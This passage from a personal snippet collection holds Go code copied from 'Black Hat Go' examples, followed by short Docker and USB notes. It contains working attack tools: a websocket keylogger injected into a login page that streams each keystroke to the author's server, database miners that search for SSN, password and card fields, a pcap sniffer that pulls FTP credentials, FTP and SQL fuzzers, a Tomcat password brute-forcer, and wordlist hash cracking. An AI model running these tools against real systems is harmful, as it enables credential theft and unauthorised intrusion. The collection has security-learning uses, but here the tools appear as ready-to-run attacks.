  var openports []int

  for i := 0; i < cap(ports); i++ {
    go worker(ports, results)
  }

  go func() {
    for i := 1; i <= 1024; i++ {
      ports <- i
    }
  }()

  for i := 0; i < 1024; i++ {
    port := <-results
    if port != 0 {
      openports = append(openports, port)
    }
  }

  close(ports)
  close(results)
  sort.Ints(openports)
  for _, port := range openports {
    fmt.Printf("%d open\n", port)
  }
}
==================================================
Websocket keylogger
(tags: websocket keylogger)
---

https://github.com/blackhat-go

1. For example use a site jsbin.com
2. Insert there

<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<script src='http://localhost:8080/k.js'></script>
<form action='/login' method='post'><input name='username'/> <input name='password'/> <input type="submit"/></form>
</body>
</html>

3. In main.go write

package main

import (
  "flag"
  "fmt"
  "html/template"
  "log"
  "net/http"

  "github.com/gorilla/mux"
  "github.com/gorilla/websocket"
)

var (
  upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },
  }

  listenAddr string
  wsAddr     string
  jsTemplate *template.Template
)

func init() {
  flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
  flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
  flag.Parse()
  var err error
  jsTemplate, err = template.ParseFiles("logger.js")
  if err != nil {
    panic(err)
  }
}

func serveWS(w http.ResponseWriter, r *http.Request) {
  conn, err := upgrader.Upgrade(w, r, nil)
  if err != nil {
    http.Error(w, "", 500)
    return
  }
  defer conn.Close()
  fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
  for {
    _, msg, err := conn.ReadMessage()
    if err != nil {
      return
    }
    fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
  }
}

func serveFile(w http.ResponseWriter, r *http.Request) {
  w.Header().Set("Content-Type", "application/javascript")
  jsTemplate.Execute(w, wsAddr)
}

func main() {
  r := mux.NewRouter()
  r.HandleFunc("/ws", serveWS)
  r.HandleFunc("/k.js", serveFile)
  log.Fatal(http.ListenAndServe(":8080", r))
}

4. In logger.js write

(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();

// example of output in serever if someone tapping on the site
From 127.0.0.1:41488: d
From 127.0.0.1:41488: f
From 127.0.0.1:41488: g
==================================================
Database miner for mongo
(tags: db miner mongo schema)
---

https://github.com/blackhat-go

// dbminer.go
package main

import (
  "fmt"
  "regexp"
)

type DatabaseMiner interface {
  GetSchema() (*Schema, error)
}

type Schema struct {
  Databases []Database
}

type Database struct {
  Name   string
  Tables []Table
}

type Table struct {
  Name    string
  Columns []string
}

func Search(m DatabaseMiner) error {
  s, err := m.GetSchema()
  if err != nil {
    return err
  }
  re := getRegex()
  for _, database := range s.Databases {
    for _, table := range database.Tables {
      for _, field := range table.Columns {
        for _, r := range re {
          if r.MatchString(field) {
            fmt.Println(database)
            fmt.Printf("[+] HIT: %s\n", field)
          }
        }
      }
    }
  }
  return nil
}

func getRegex() []*regexp.Regexp {
  return []*regexp.Regexp{
    regexp.MustCompile(`(?i)social`),
    regexp.MustCompile(`(?i)ssn`),
    regexp.MustCompile(`(?i)pass(word)?`),
    regexp.MustCompile(`(?i)hash`),
    regexp.MustCompile(`(?i)ccnum`),
    regexp.MustCompile(`(?i)card`),
    regexp.MustCompile(`(?i)security`),
    regexp.MustCompile(`(?i)key`),
  }
}

func (s Schema) String() string {
  var ret string
  for _, database := range s.Databases {
    ret += fmt.Sprint(database.String() + "\n")
  }
  return ret
}

func (d Database) String() string {
  ret := fmt.Sprintf("[DB] = %+s\n", d.Name)
  for _, table := range d.Tables {
    ret += table.String()
  }
  return ret
}

func (t Table) String() string {
  ret := fmt.Sprintf("    [TABLE] = %+s\n", t.Name)
  for _, field := range t.Columns {
    ret += fmt.Sprintf("       [COL] = %+s\n", field)
  }
  return ret
}

// main.go
package main

import (
  "os"
  "gopkg.in/mgo.v2"
  "gopkg.in/mgo.v2/bson"
)

type MongoMiner struct {
  Host    string
  session *mgo.Session
}

func New(host string) (*MongoMiner, error) {
  m := MongoMiner{Host: host}
  err := m.connect()
  if err != nil {
    return nil, err
  }
  return &m, nil
}

func (m *MongoMiner) connect() error {
  s, err := mgo.Dial(m.Host)
  if err != nil {
    return err
  }
  m.session = s
  return nil
}

func (m *MongoMiner) GetSchema() (*dbminer.Schema, error) {
  var s = new(dbminer.Schema)

  dbnames, err := m.session.DatabaseNames()
  if err != nil {
    return nil, err
  }

  for _, dbname := range dbnames {
    db := dbminer.Database{Name: dbname, Tables: []dbminer.Table{}}
    collections, err := m.session.DB(dbname).CollectionNames()
    if err != nil {
      return nil, err
    }

    for _, collection := range collections {
      table := dbminer.Table{Name: collection, Columns: []string{}}

      var docRaw bson.Raw
      err := m.session.DB(dbname).C(collection).Find(nil).One(&docRaw)
      if err != nil {
        return nil, err
      }

      var doc bson.RawD
      if err := docRaw.Unmarshal(&doc); err != nil {
        if err != nil {
          return nil, err
        }
      }

      for _, f := range doc {
        table.Columns = append(table.Columns, f.Name)
      }
      db.Tables = append(db.Tables, table)
    }
    s.Databases = append(s.Databases, db)
  }
  return s, nil
}

func main() {
  mm, err := New(os.Args[1])
  if err != nil {
    panic(err)
  }
  if err := Search(mm); err != nil {
    panic(err)
  }
}
==================================================
Database miner for mysql
(tags: db miner mysql schema)
---

https://github.com/blackhat-go

// dbminer.go
package main

import (
  "fmt"
  "regexp"
)

type DatabaseMiner interface {
  GetSchema() (*Schema, error)
}

type Schema struct {
  Databases []Database
}

type Database struct {
  Name   string
  Tables []Table
}

type Table struct {
  Name    string
  Columns []string
}

func Search(m DatabaseMiner) error {
  s, err := m.GetSchema()
  if err != nil {
    return err
  }
  re := getRegex()
  for _, database := range s.Databases {
    for _, table := range database.Tables {
      for _, field := range table.Columns {
        for _, r := range re {
          if r.MatchString(field) {
            fmt.Println(database)
            fmt.Printf("[+] HIT: %s\n", field)
          }
        }
      }
    }
  }
  return nil
}

func getRegex() []*regexp.Regexp {
  return []*regexp.Regexp{
    regexp.MustCompile(`(?i)social`),
    regexp.MustCompile(`(?i)ssn`),
    regexp.MustCompile(`(?i)pass(word)?`),
    regexp.MustCompile(`(?i)hash`),
    regexp.MustCompile(`(?i)ccnum`),
    regexp.MustCompile(`(?i)card`),
    regexp.MustCompile(`(?i)security`),
    regexp.MustCompile(`(?i)key`),
  }
}

func (s Schema) String() string {
  var ret string
  for _, database := range s.Databases {
    ret += fmt.Sprint(database.String() + "\n")
  }
  return ret
}

func (d Database) String() string {
  ret := fmt.Sprintf("[DB] = %+s\n", d.Name)
  for _, table := range d.Tables {
    ret += table.String()
  }
  return ret
}

func (t Table) String() string {
  ret := fmt.Sprintf("    [TABLE] = %+s\n", t.Name)
  for _, field := range t.Columns {
    ret += fmt.Sprintf("       [COL] = %+s\n", field)
  }
  return ret
}

// main.go
package main

import (
  "database/sql"
  "fmt"
  "log"
  "os"

  _ "github.com/go-sql-driver/mysql"
  "github.com/blackhat-go/bhg/ch-7/db/dbminer"
)

type MySQLMiner struct {
  Host string
  Db   sql.DB
}

func New(host string) (*MySQLMiner, error) {
  m := MySQLMiner{Host: host}
  err := m.connect()
  if err != nil {
    return nil, err
  }
  return &m, nil
}

func (m *MySQLMiner) connect() error {

  db, err := sql.Open("mysql", fmt.Sprintf("root:password@tcp(%s:3306)/information_schema", m.Host))
  if err != nil {
    log.Panicln(err)
  }
  m.Db = *db
  return nil
}

func (m *MySQLMiner) GetSchema() (*dbminer.Schema, error) {
  var s = new(dbminer.Schema)

  sql := `SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns
  WHERE TABLE_SCHEMA NOT IN ('mysql', 'information_schema', 'performance_schema', 'sys')
  ORDER BY TABLE_SCHEMA, TABLE_NAME`
  schemarows, err := m.Db.Query(sql)
  if err != nil {
    return nil, err
  }
  defer schemarows.Close()

  var prevschema, prevtable string
  var db dbminer.Database
  var table dbminer.Table
  for schemarows.Next() {
    var currschema, currtable, currcol string
    if err := schemarows.Scan(&currschema, &currtable, &currcol); err != nil {
      return nil, err
    }

    if currschema != prevschema {
      if prevschema != "" {
        db.Tables = append(db.Tables, table)
        s.Databases = append(s.Databases, db)
      }
      db = dbminer.Database{Name: currschema, Tables: []dbminer.Table{}}
      prevschema = currschema
      prevtable = ""
    }

    if currtable != prevtable {
      if prevtable != "" {
        db.Tables = append(db.Tables, table)
      }
      table = dbminer.Table{Name: currtable, Columns: []string{}}
      prevtable = currtable
    }
    table.Columns = append(table.Columns, currcol)
  }
  db.Tables = append(db.Tables, table)
  s.Databases = append(s.Databases, db)
  if err := schemarows.Err(); err != nil {
    return nil, err
  }

  return s, nil
}

func main() {
  mm, err := New(os.Args[1])
  if err != nil {
    panic(err)
  }
  defer mm.Db.Close()
  if err := dbminer.Search(mm); err != nil {
    panic(err)
  }
}
==================================================
Using pcap for finding all devices
(tags: pcap device find)
---

https://github.com/blackhat-go

// sudo apt install libpcap-dev

package main

import (
  "fmt"
  "log"
  "github.com/google/gopacket/pcap"
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }

  for _, device := range devices {
    fmt.Println(device.Name)
    for _, address := range device.Addresses {
      fmt.Printf("    IP:      %s\n", address.IP)
      fmt.Printf("    Netmask: %s\n", address.Netmask)
    }
  }
}
==================================================
Capturing packets and filter them
(tags: pcap packet filter)
---

https://github.com/blackhat-go

package main

import (
  "fmt"
  "log"
  "github.com/google/gopacket"
  "github.com/google/gopacket/pcap"
)

var (
  iface    = "enp0s5"
  snaplen  = int32(1600)
  promisc  = false
  timeout  = pcap.BlockForever
  filter   = "tcp and port 80"
  devFound = false
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }

  for _, device := range devices {
    if device.Name == iface {
      devFound = true
    }
  }
  if !devFound {
    log.Panicf("Device named '%s' does not exist\n", iface)
  }

  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
  if err != nil {
    log.Panicln(err)
  }
  defer handle.Close()

  if err := handle.SetBPFFilter(filter); err != nil {
    log.Panicln(err)
  }

  source := gopacket.NewPacketSource(handle, handle.LinkType())
  for packet := range source.Packets() {
    fmt.Println(packet)
  }
}
==================================================
Ispect payload from ftp packets using pcap
(tags: pcap packet ftp payload)
---

https://github.com/blackhat-go

package main

import (
  "bytes"
  "fmt"
  "log"
  "github.com/google/gopacket"
  "github.com/google/gopacket/pcap"
)

var (
  iface    = "enp0s5"
  snaplen  = int32(1600)
  promisc  = false
  timeout  = pcap.BlockForever
  filter   = "tcp and dst port 21"
  devFound = false
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }

  for _, device := range devices {
    if device.Name == iface {
      devFound = true
    }
  }
  if !devFound {
    log.Panicf("Device named '%s' does not exist\n", iface)
  }

  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
  if err != nil {
    log.Panicln(err)
  }
  defer handle.Close()

  if err := handle.SetBPFFilter(filter); err != nil {
    log.Panicln(err)
  }

  source := gopacket.NewPacketSource(handle, handle.LinkType())
  for packet := range source.Packets() {
    appLayer := packet.ApplicationLayer()
    if appLayer == nil {
      continue
    }
    payload := appLayer.Payload()
    if bytes.Contains(payload, []byte("USER")) {
      fmt.Print(string(payload))
    } else if bytes.Contains(payload, []byte("PASS")) {
      fmt.Print(string(payload))
    }
  }
}
==================================================
Ftp fuzzer
(tags: ftp fuzzer)
---

https://github.com/blackhat-go

package main

import (
  "bufio"
  "fmt"
  "log"
  "net"
)

func main() {
  for i := 0; i < 2500; i++ {
    conn, err := net.Dial("tcp", "10.0.1.20:21")
    if err != nil {
      log.Fatalf("[!] Error at offset %d: %s\n", i, err)
    }
    bufio.NewReader(conn).ReadString('\n')

    user := ""
    for n := 0; n <= i; n++ {
      user += "A"
    }

    raw := "USER %s\n"
    fmt.Fprintf(conn, raw, user)
    bufio.NewReader(conn).ReadString('\n')

    raw = "PASS password\n"
    fmt.Fprint(conn, raw)
    bufio.NewReader(conn).ReadString('\n')

    if err := conn.Close(); err != nil {
      log.Println("[!] Unable to close connection. Is service alive?")
    }
  }
}
==================================================
Http sql fuzzer
(tags: http sql fuzzer)
---

https://github.com/blackhat-go

package main

import (
  "bytes"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
  "regexp"
)

func main() {
  payloads := []string{
    "baseline",
    ")",
    "(",
    "\"",
    "'",
  }

  sqlErrors := []string{
    "SQL",
    "MySQL",
    "ORA-",
    "syntax",
  }

  errRegexes := []*regexp.Regexp{}
  for _, e := range sqlErrors {
    re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))
    errRegexes = append(errRegexes, re)
  }

  for _, payload := range payloads {
    client := new(http.Client)
    body := []byte(fmt.Sprintf("username=%s&password=p", payload))
    req, err := http.NewRequest(
      "POST",
      "http://10.0.1.20:8080/WebApplication/login.jsp?debug=true",
      bytes.NewReader(body),
    )
    if err != nil {
      log.Fatalf("[!] Unable to generate request: %s\n", err)
    }
    req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
    resp, err := client.Do(req)
    if err != nil {
      log.Fatalf("[!] Unable to process response: %s\n", err)
    }
    body, err = ioutil.ReadAll(resp.Body)
    if err != nil {
      log.Fatalf("[!] Unable to read response body: %s\n", err)
    }
    resp.Body.Close()

    for idx, re := range errRegexes {
      if re.MatchString(string(body)) {
        fmt.Printf(
          "[+] SQL Error found ('%s') for payload: %s\n",
          sqlErrors[idx],
          payload,
        )
        break
      }
    }
  }
}
==================================================
Plugin on lua for go
(tags: plugin lua)
---

https://github.com/blackhat-go

// plugins/tomcat.lua
usernames = {"admin", "manager", "tomcat"}
passwords = {"admin", "manager", "tomcat", "password"}

status, basic, err = http.head("10.0.1.20", 8080, "/manager/html")
if err ~= "" then
    print("[!] Error: "..err)
    return
end
if status ~= 401 or not basic then
    print("[!] Error: Endpoint does not require Basic Auth. Exiting.")
    return
end
print("[+] Endpoint requires Basic Auth. Proceeding with password guessing")
for i, username in ipairs(usernames) do
    for j, password in ipairs(passwords) do
        status, basic, err = http.get("10.0.1.20", 8080, username, password, "/manager/html")
        if status == 200 then
            print("[+] Found creds - "..username..":"..password)
            return
        end
    end
end

// cmd/scanner/main.go
package main

import (
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
  "os"

  lua "github.com/yuin/gopher-lua"
)

const (
  LuaHttpTypeName = "http"
  PluginsDir      = "../../plugins"
)

func register(l *lua.LState) {
  mt := l.NewTypeMetatable(LuaHttpTypeName)
  l.SetGlobal("http", mt)
  // static attributes
  l.SetField(mt, "head", l.NewFunction(head))
  l.SetField(mt, "get", l.NewFunction(get))
}

func head(l *lua.LState) int {
  var (
    host string
    port uint64
    path string
    resp *http.Response
    err  error
    url  string
  )
  host = l.CheckString(1)
  port = uint64(l.CheckInt64(2))
  path = l.CheckString(3)
  url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
  if resp, err = http.Head(url); err != nil {
    l.Push(lua.LNumber(0))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(fmt.Sprintf("Request failed: %s", err)))
    return 3
  }
  l.Push(lua.LNumber(resp.StatusCode))
  l.Push(lua.LBool(resp.Header.Get("WWW-Authenticate") != ""))
  l.Push(lua.LString(""))
  return 3
}

func get(l *lua.LState) int {
  var (
    host     string
    port     uint64
    username string
    password string
    path     string
    resp     *http.Response
    err      error
    url      string
    client   *http.Client
    req      *http.Request
  )
  host = l.CheckString(1)
  port = uint64(l.CheckInt64(2))
  username = l.CheckString(3)
  password = l.CheckString(4)
  path = l.CheckString(5)
  url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
  client = new(http.Client)
  if req, err = http.NewRequest("GET", url, nil); err != nil {
    l.Push(lua.LNumber(0))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(fmt.Sprintf("Unable to build GET request: %s", err)))
    return 3
  }
  if username != "" || password != "" {
    // Assume Basic Auth is required since user and/or password is set
    req.SetBasicAuth(username, password)
  }
  if resp, err = client.Do(req); err != nil {
    l.Push(lua.LNumber(0))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(fmt.Sprintf("Unable to send GET request: %s", err)))
    return 3
  }
  l.Push(lua.LNumber(resp.StatusCode))
  l.Push(lua.LBool(false))
  l.Push(lua.LString(""))
  return 3
}

func main() {
  var (
    l     *lua.LState
    files []os.FileInfo
    err   error
    f     string
  )
  l = lua.NewState()
  defer l.Close()
  register(l)
  if files, err = ioutil.ReadDir(PluginsDir); err != nil {
    log.Fatalln(err)
  }

  for idx := range files {
    fmt.Println("Found plugin: " + files[idx].Name())
    f = fmt.Sprintf("%s/%s", PluginsDir, files[idx].Name())
    if err := l.DoFile(f); err != nil {
      log.Fatalln(err)
    }
  }
}
==================================================
Plugin
(tags: plugin)
---

// plugins/plugin_name.go
// go build -buildmode=plugin
package main

import "fmt"

var V int

func F() { fmt.Printf("Hello, number %d\n", V) }

// main.go
p, err := plugin.Open("plugin_name.so")
v, err := p.Lookup("V")
f, err := p.Lookup("F")

*v.(*int) = 7
f.(func())() // prints "Hello, number 7"
==================================================
Crypto aes
(tags: crypto aes)
---

https://github.com/blackhat-go

package main

import (
  "bytes"
  "crypto/aes"
  "crypto/cipher"
  "crypto/rand"
  "errors"
  "fmt"
  "io"
  "log"
)

func pad(buf []byte) []byte {
  // Assumes valid lengths. Should add additional checks.
  length := len(buf)
  padding := aes.BlockSize - (length % aes.BlockSize)
  if padding == 0 {
    padding = aes.BlockSize
  }
  padded := make([]byte, length+padding)
  copy(padded, buf)
  copy(padded[length:], bytes.Repeat([]byte{byte(padding)}, padding))
  return padded
}

func unpad(buf []byte) []byte {
  // Assume valid length and padding. Should add checks
  padding := int(buf[len(buf)-1])
  return buf[:len(buf)-padding]
}

func encrypt(plaintext, key []byte) ([]byte, error) {
  var (
    ciphertext []byte
    iv         []byte
    block      cipher.Block
    mode       cipher.BlockMode
    err        error
  )

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  iv = make([]byte, aes.BlockSize)
  if _, err = io.ReadFull(rand.Reader, iv); err != nil {
    log.Fatalln(err)
  }

  mode = cipher.NewCBCEncrypter(block, iv)

  plaintext = pad(plaintext)
  ciphertext = make([]byte, aes.BlockSize+len(plaintext))
  copy(ciphertext, iv)
  mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

  return ciphertext, nil
}

func decrypt(ciphertext, key []byte) ([]byte, error) {
  var (
    plaintext []byte
    iv        []byte
    block     cipher.Block
    mode      cipher.BlockMode
    err       error
  )

  if len(ciphertext) < aes.BlockSize {
    return nil, errors.New("Invalid ciphertext length: too short")
  }

  if len(ciphertext)%aes.BlockSize != 0 {
    return nil, errors.New("Invalid ciphertext length: not a multiple of blocksize")
  }

  iv = ciphertext[:aes.BlockSize]
  ciphertext = ciphertext[aes.BlockSize:]

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  mode = cipher.NewCBCDecrypter(block, iv)
  plaintext = make([]byte, len(ciphertext))
  mode.CryptBlocks(plaintext, ciphertext)
  plaintext = unpad(plaintext)

  return plaintext, nil
}

func main() {
  var (
    err        error
    plaintext  []byte
    ciphertext []byte
    key        []byte
  )

  key = make([]byte, 32)
  if _, err = io.ReadFull(rand.Reader, key); err != nil {
    log.Fatalln(err)
  }

  plaintext = []byte("4321123456789090")
  if ciphertext, err = encrypt(plaintext, key); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("key        = %x\n", key)
  fmt.Printf("ciphertext = %x\n", ciphertext)

  if plaintext, err = decrypt(ciphertext, key); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("plaintext  = %s\n", plaintext)
}
==================================================
Crypto bcrypt
(tags: crypto bcrypt)
---

https://github.com/blackhat-go

package main

import (
  "log"
  "os"

  "golang.org/x/crypto/bcrypt"
)

var storedHash = "$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu"

func main() {
  // someC0mpl3xP@ssw0rd
  var password string
  if len(os.Args) != 2 {
    log.Fatalln("Usage: bcrypt password")
  }
  password = os.Args[1]

  hash, err := bcrypt.GenerateFromPassword(
    []byte(password),
    bcrypt.DefaultCost,
  )
  if err != nil {
    log.Fatalln(err)
  }
  log.Printf("hash = %s\n", hash)

  err = bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(password))
  if err != nil {
    log.Println("[!] Authentication failed")
    return
  }
  log.Println("[+] Authentication successful")
}
==================================================
Crypto gcm
(tags: crypto gcm)
---

https://github.com/blackhat-go

package main

import (
  "crypto/aes"
  "crypto/cipher"
  "crypto/rand"
  "errors"
  "fmt"
  "io"
  "log"
)

var key = make([]byte, 32)

func encrypt(plaintext []byte) ([]byte, error) {
  var (
    ciphertext []byte
    nonce      []byte
    block      cipher.Block
    aead       cipher.AEAD
    err        error
  )

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  if aead, err = cipher.NewGCM(block); err != nil {
    return nil, err
  }

  nonce = make([]byte, aead.NonceSize())
  if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
    log.Fatalln(err)
  }

  ciphertext = aead.Seal(nil, nonce, plaintext, nil)

  ciphertext = append(nonce, ciphertext...)
  return ciphertext, nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
  var (
    plaintext []byte
    nonce     []byte
    block     cipher.Block
    aead      cipher.AEAD
    err       error
  )

  if block, err = aes.NewCipher(key); err != nil {
    return nil, err
  }

  if aead, err = cipher.NewGCM(block); err != nil {
    return nil, err
  }

  nonceSize := aead.NonceSize()
  if len(ciphertext) < nonceSize {
    return nil, errors.New("Invalid ciphertext length")
  }
  nonce = ciphertext[:nonceSize]
  ciphertext = ciphertext[nonceSize:]

  if plaintext, err = aead.Open(nil, nonce, ciphertext, nil); err != nil {
    return nil, err
  }

  return plaintext, nil
}

func main() {
  var (
    err        error
    plaintext  []byte
    ciphertext []byte
  )

  if _, err = io.ReadFull(rand.Reader, key); err != nil {
    log.Fatalln(err)
  }

  plaintext = []byte("privet")
  if ciphertext, err = encrypt(plaintext); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("ciphertext = %x\n", ciphertext)

  if plaintext, err = decrypt(ciphertext); err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("plaintext = %s\n", plaintext)
}
==================================================
Crypto md5 hash
(tags: crypto md5 hash)
---

https://github.com/blackhat-go

// wordlist.txt
password
Password
Nickelback4life
Summer2017

// main.go
package main

import (
  "bufio"
  "crypto/md5"
  "fmt"
  "log"
  "os"
)

var md5hash = "77f62e3524cd583d698d51fa24fdff4f"

func main() {
  f, err := os.Open("wordlist.txt")
  if err != nil {
    log.Fatalln(err)
  }
  defer f.Close()

  scanner := bufio.NewScanner(f)
  for scanner.Scan() {
    password := scanner.Text()
    hash := fmt.Sprintf("%x", md5.Sum([]byte(password)))
    if hash == md5hash {
      fmt.Printf("[+] Password found (MD5): %s\n", password)
    }
  }

  if err := scanner.Err(); err != nil {
    log.Fatalln(err)
  }
}
==================================================
Crypto sha256 hash
(tags: crypto sha256 hash)
---

https://github.com/blackhat-go

// wordlist.txt
password
Password
Nickelback4life
Summer2017

// main.go
package main

import (
  "bufio"
  "crypto/sha256"
  "fmt"
  "log"
  "os"
)

var sha256hash = "95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced"

func main() {
  f, err := os.Open("wordlist.txt")
  if err != nil {
    log.Fatalln(err)
  }
  defer f.Close()

  scanner := bufio.NewScanner(f)
  for scanner.Scan() {
    password := scanner.Text()
    hash := fmt.Sprintf("%x", sha256.Sum256([]byte(password)))
    if hash == sha256hash {
      fmt.Printf("[+] Password found (SHA-256): %s\n", password)
    }
  }

  if err := scanner.Err(); err != nil {
    log.Fatalln(err)
  }
}
==================================================
Crypto hmac
(tags: crypto hmac)
---

https://github.com/blackhat-go

package main

import (
  "crypto/hmac"
  "crypto/sha256"
  "encoding/hex"
  "fmt"
)

var key = []byte("some random key")

func checkMAC(message, recvMAC []byte) bool {
  mac := hmac.New(sha256.New, key)
  mac.Write(message)
  calcMAC := mac.Sum(nil)

  return hmac.Equal(calcMAC, recvMAC)
}

func main() {
  // In real implementations, we’d read the message and HMAC value from network source
  message := []byte("The red eagle flies at 10:00")
  mac, _ := hex.DecodeString("69d2c7b6fbbfcaeb72a3172f4662601d1f16acfb46339639ac8c10c8da64631d")
  if checkMAC(message, mac) {
    fmt.Println("EQUAL")
  } else {
    fmt.Println("NOT EQUAL")
  }
}
==================================================
Crypto cert tls
(tags: crypto cert tls)
---

https://github.com/blackhat-go

// cert for server
// openssl req -nodes -x509 -newkey rsa:4096 -keyout serverKey.pem -out serverCrt.pem -days 365
// Country Name (2 letter code) [AU]:
// State or Province Name (full name) [Some-State]:
// Locality Name (eg, city) []:
// Organization Name (eg, company) [Internet Widgits Pty Ltd]:
// Organizational Unit Name (eg, section) []:
// Common Name (e.g. server FQDN or YOUR name) []:localhost
// Email Address []:

// cert for client
// openssl req -nodes -x509 -newkey rsa:4096 -keyout clientKey.pem -out clientCrt.pem -days 365
// Country Name (2 letter code) [AU]:
// State or Province Name (full name) [Some-State]:
// Locality Name (eg, city) []:
// Organization Name (eg, company) [Internet Widgits Pty Ltd]:
// Organizational Unit Name (eg, section) []:
// Common Name (e.g. server FQDN or YOUR name) []:Tom
// Email Address []:

// set enviroment for build go GODEBUG=x509ignoreCN=0

// curl -ik -X GET --cert clientCrt.pem --key clientKey.pem https://localhost:9443/hello

// cmd/client/main.go
package main

import (
  "crypto/tls"
  "crypto/x509"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
)

func main() {
  var (
    err              error
    cert             tls.Certificate
    serverCert, body []byte
    pool             *x509.CertPool
    tlsConf          *tls.Config
    transport        *http.Transport
    client           *http.Client
    resp             *http.Response
  )

  if cert, err = tls.LoadX509KeyPair("clientCrt.pem", "clientKey.pem"); err != nil {
    log.Fatalln(err)
  }

  if serverCert, err = ioutil.ReadFile("../server/serverCrt.pem"); err != nil {
    log.Fatalln(err)
  }

  pool = x509.NewCertPool()
  pool.AppendCertsFromPEM(serverCert)

  tlsConf = &tls.Config{
    Certificates: []tls.Certificate{cert},
    RootCAs:      pool,
  }
  tlsConf.BuildNameToCertificate()

  transport = &http.Transport{
    TLSClientConfig: tlsConf,
  }
  client = &http.Client{
    Transport: transport,
  }

  if resp, err = client.Get("https://server.blackhat-go.local:9443/hello"); err != nil {
    log.Fatalln(err)
  }
  if body, err = ioutil.ReadAll(resp.Body); err != nil {
    log.Fatalln(err)
  }
  defer resp.Body.Close()

  fmt.Printf("Success: %s\n", body)
}

// cmd/server/main.go
package main

import (
  "crypto/tls"
  "crypto/x509"
  "fmt"
  "io/ioutil"
  "log"
  "net/http"
)

func helloHandler(w http.ResponseWriter, r *http.Request) {
  fmt.Printf("Hello: %s\n", r.TLS.PeerCertificates[0].Subject.CommonName)
  fmt.Fprint(w, "Authentication successful")
}

func main() {
  var (
    err        error
    clientCert []byte
    pool       *x509.CertPool
    tlsConf    *tls.Config
    server     *http.Server
  )

  http.HandleFunc("/hello", helloHandler)

  if clientCert, err = ioutil.ReadFile("../client/clientCrt.pem"); err != nil {
    log.Fatalln(err)
  }
  pool = x509.NewCertPool()
  pool.AppendCertsFromPEM(clientCert)

  tlsConf = &tls.Config{
    ClientCAs:  pool,
    ClientAuth: tls.RequireAndVerifyClientCert,
  }
  tlsConf.BuildNameToCertificate()

  server = &http.Server{
    Addr:      ":9443",
    TLSConfig: tlsConf,
  }
  log.Fatalln(server.ListenAndServeTLS("serverCrt.pem", "serverKey.pem"))
}
==================================================
Sign message and veryfy signature
(tags: crypto sign message verify)
---

https://github.com/blackhat-go

package main

import (
  "crypto"
  "crypto/rand"
  "crypto/rsa"
  "crypto/sha256"
  "fmt"
  "log"
)

func main() {
  var (
    err                                              error
    privateKey                                       *rsa.PrivateKey
    publicKey                                        *rsa.PublicKey
    message, plaintext, ciphertext, signature, label []byte
  )

  if privateKey, err = rsa.GenerateKey(rand.Reader, 2048); err != nil {
    log.Fatalln(err)
  }
  publicKey = &privateKey.PublicKey

  label = []byte("")
  message = []byte("Some super secret message, maybe a session key even")
  ciphertext, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, message, label)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("Ciphertext: %x\n", ciphertext)

  plaintext, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, ciphertext, label)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("Plaintext: %s\n", plaintext)

  h := sha256.New()
  h.Write(message)
  signature, err = rsa.SignPSS(rand.Reader, privateKey, crypto.SHA256, h.Sum(nil), nil)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Printf("Signature: %x\n", signature)

  err = rsa.VerifyPSS(publicKey, crypto.SHA256, h.Sum(nil), signature, nil)
  if err != nil {
    log.Fatalln(err)
  }
  fmt.Println("Signature verified")
}
==================================================
Remove all images in docker
(tags: remove image docker)
---

docker container stop $(docker container ls -aq)
docker container prune -f
docker rmi -f $(docker images -a -q)
==================================================
Write ubuntu on usb flash
(tags: ubuntu usb)
---

1. Download ubuntu from ubuntu.com
2. Download the program Universal-USB-Installer-1.9.9.3.exe
3. Format the usb-flash in fat32
4. In installer chose the mode fat32
5. With program HxD fixed the bytes of the boot sector of the usb-flash accordind the article https://habr.com/ru/post/128004/
6. In Sector 0 at the end, assign the first byte 80h to the link
==================================================
Docker enter into container
(tags: docker enter container)
---

docker ps
docker exec -it mycontainer sh
// docker exec -it re583725uh bash
printenv
==================================================
Docker-compose enter into container
(tags: compose enter container)
---

sudo docker-compose exec mycontainer bash
==================================================
Clickhouse client
